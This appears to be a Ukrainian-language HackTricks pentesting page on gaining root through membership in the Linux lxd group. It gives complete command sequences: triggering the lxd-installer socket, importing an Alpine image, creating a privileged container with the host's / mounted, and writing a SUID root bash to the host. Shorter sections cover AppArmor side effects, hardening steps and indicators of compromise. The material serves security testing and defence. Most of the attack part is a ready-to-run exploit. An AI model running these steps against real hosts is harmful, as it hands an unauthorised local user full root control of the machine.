# lxd/lxc Group - Підвищення привілеїв

{{#include ../../../banners/hacktricks-training.md}}

Членство в групі керування LXD на хості (зазвичай _**lxd**_) може відкрити шлях до root, надаючи повний контроль над демоном.<sup>[[1]](#references)</sup> Це та сама проблема межі довіри, що й у випадку з [runtime control sockets](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) та [writable host mounts](../../containers-namespaces/container-security/sensitive-host-mounts.md): доступу до API керування може бути достатньо, навіть якщо поточний процес не запущений у контейнері.<sup>[[1]](#references)</sup>

## Активація сокета Ubuntu `lxd-installer`

Не вважайте членство в групі `lxd` безпечним лише тому, що snap-пакет LXD відсутній. В Ubuntu Server 24.04 і новіших версіях попередньо встановлений пакет `lxd-installer` надає `/run/lxd-installer.socket` з власником `root:lxd` і режимом `0660`. Підключення активує `lxd-installer@.service` від імені root, який встановлює snap-пакет LXD без пароля sudo чи авторизації polkit; у деяких версіях обгортки також пропускається запит підтвердження, якщо стандартний ввід не є TTY.<sup>[[10]](#references)[[11]](#references)</sup>

Перевірте і членство облікового запису в групах, і сервіс, що активується сокетом:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

Авторизований тест для групи `lxd` може активувати інсталятор через звичайну обгортку `lxc` або під’єднавшись безпосередньо до сокета. Другий спосіб показує, що фактичною межею авторизації є ACL Unix-сокета, а не запит обгортки:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

Коли демон стане доступним, продовжуйте з наведеними нижче техніками привілейованих контейнерів.<sup>[[10]](#references)[[11]](#references)</sup>

## Експлуатація без інтернету

### Метод 1

Ви можете завантажити образ Alpine для використання з LXD із надійного репозиторію.
Сервер образів LXD від Canonical публікує щоденні збірки: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Просто завантажте **lxd.tar.xz** і **rootfs.squashfs** з найновішої збірки (назва каталогу — дата).<sup>[[8]](#references)</sup>

Також ви можете встановити distrobuilder на своєму комп’ютері, дотримуючись [інструкцій проєкту](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

Завантажте **incus.tar.xz** (**lxd.tar.xz**, якщо ви завантажили його із сервера образів Canonical) і **rootfs.squashfs**, а потім імпортуйте образ і створіть контейнер.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> Якщо ви побачите цю помилку _**Error: No storage pool found. Please create a new storage pool**_\
> Запустіть **`lxd init`**, налаштуйте пул сховища за замовчуванням, а потім **повторіть** попередній блок команд.<sup>[[2]](#references)</sup>

Нарешті, запустіть контейнер і відкрийте оболонку root у файловій системі хоста:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

Оскільки UID 0 у цьому привілейованому екземплярі не перепризначається, він може створити SUID-файл із власником-хостом через змонтований кореневий каталог хоста. Це завершує перехід із контейнера на хост, а не залишає оператора в оболонці контейнера:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

Розмістіть payload у файловій системі, яка підтримує SUID. Окремий розділ `/tmp` зазвичай монтується з параметром `nosuid` і може бути недоступним через нерекурсивне монтування host `/`, тому для цього підтвердження надійніше використати шлях на кшталт `/rootbash` у кореневій файловій системі host.<sup>[[10]](#references)[[11]](#references)</sup>

### Метод 2

Створіть образ Alpine і запустіть його з прапорцем `security.privileged=true`, який зіставляє root контейнера з root host; монтування `/` тоді відкриває файлову систему host у контейнері.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## Побічний ефект AppArmor на рівні хоста

Запуск snap-пакета LXD також може створити `/run/sysctl.d/zz-lxd.conf` і встановити для `kernel.apparmor_restrict_unprivileged_userns` та `kernel.apparmor_restrict_unprivileged_unconfined` значення `0`. Це послаблює обмеження Ubuntu для непривілейованих просторів імен користувачів для всіх локальних користувачів, тому під час оцінювання хоста зафіксуйте значення до та після активації LXD.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Аудит і посилення безпеки

Вважайте членство в `lxd` наданням прав root. Видалення зайвого учасника набуває чинності для нових сеансів входу; очищення `lxd-installer` або маскування його сокета лише видаляє шлях встановлення на вимогу й **не** обмежує користувача, який уже має доступ до встановленого демона LXD.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

Корисні індикатори компрометації: екземпляри LXD із `security.privileged=true`, дискові пристрої, у яких `source` має значення `/`, неочікувані з’єднання з `/run/lxd-installer.socket`, нові файли SUID і зміна наведених вище параметрів sysctl AppArmor із `1` на `0`.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [Як посилити безпеку LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [Контейнери LXD та віртуальні машини](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Як копіювати й імпортувати образи](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Як створювати образи за допомогою distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Визначення образу Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Скрипт збірки lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [Сервер образів LXD](https://images.lxd.canonical.com/)
- [9] [Тип: диск](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [Звіт STAR Labs про підвищення привілеїв через групу LXD і PoC](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [Старе вино в новій пляшці: десятирічний root через групу LXD знову в строю](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
